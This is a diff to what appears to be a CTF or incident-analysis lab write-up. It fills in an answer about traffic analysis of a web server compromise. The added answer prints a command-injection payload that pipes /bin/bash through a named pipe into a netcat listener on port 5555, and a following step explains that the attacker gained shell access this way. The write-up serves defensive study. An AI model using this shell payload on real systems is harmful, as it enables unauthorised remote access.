@@ -180,12 +180,17 @@ It is crucial to use flag sort first before uniq.
 ![image](https://github.com/user-attachments/assets/fe2e53f6-cbf7-4041-a8af-c714af629887)
 
 
-> 9TH QUESTION --> ANS:
+> 9TH QUESTION --> ANS: `|mkfifo /tmp/mypipe;cat /tmp/mypipe|/bin/bash|nc -l -p 5555 >/tmp/mypipe`
 
 ![image](https://github.com/user-attachments/assets/a36ebc73-d9da-49f7-9045-a3d4aa352df6)
 
 
-> 10TH QUESTION --> ANS:
+27. Based from our previous finding we identified the threat actor attempted a bash reverse shell with port 5555. Afterwards, the next traffics are TCP and we can see threat actor's activities at the web server. This conclude the threat actor gained access using the reverse shell.
+
+![image](https://github.com/user-attachments/assets/b4cf6f17-6002-470c-aa12-bcc81a57c04f)
+
+
+> 10TH QUESTION --> ANS: 
 
 ![image](https://github.com/user-attachments/assets/d7178191-3ed0-454c-b735-8dcd1969fcc6)
 
